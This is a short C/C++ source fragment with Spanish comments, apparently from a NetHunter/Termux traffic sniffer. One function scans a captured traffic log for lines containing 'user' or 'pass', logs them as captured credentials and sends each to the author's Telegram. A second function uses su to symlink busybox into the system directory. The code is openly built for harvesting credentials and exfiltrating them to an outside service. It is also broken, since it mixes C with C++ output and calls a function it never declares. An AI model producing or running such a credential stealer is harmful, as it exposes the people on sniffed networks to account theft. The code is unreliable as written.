#include <stdio.h>
#include <string.h>

void analizar_trafico() {
    FILE *fp = fopen("/sdcard/www/monitor.log", "r");
    char linea[1024];
    
    if (fp == NULL) return;

    while (fgets(linea, sizeof(linea), fp)) {
        // Buscamos patrones comunes de credenciales en texto plano
        if (strcasestr(linea, "user") || strcasestr(linea, "pass")) {
            printf("[!] CREDENCIAL DETECTADA: %s\n", linea);
            
            // 1. Resaltar en el Dashboard (escribiendo en un archivo especial)
            FILE *alert_fp = fopen("/sdcard/www/alerts.txt", "a");
            fprintf(alert_fp, "CRITICAL: %s", linea);
            fclose(alert_fp);

            // 2. Enviar a tu Telegram
            char msg[1024];
            sprintf(msg, "🔐 Linux SNIFFER: Posible credencial capturada: %s", linea);
            enviar_telegram(msg); // Usando la función que creamos antes
        }
    }
    fclose(fp);
}
void autoFixEnvironment() {
    std::cout << "[*] Verificando dependencias de NetHunter...\n";
    // Intenta ejecutar un comando de busybox, si falla, lo reporta
    if (system("busybox --help > /dev/null 2>&1") != 0) {
        std::cout << "[!] BusyBox no responde. Ejecutando enlace de emergencia...\n";
        system("su -c 'ln -s /data/data/com.termux/files/usr/bin/busybox /system/xbin/busybox'");
    } else {
        std::cout << "[OK] Entorno de comandos listo.\n";
    }
}

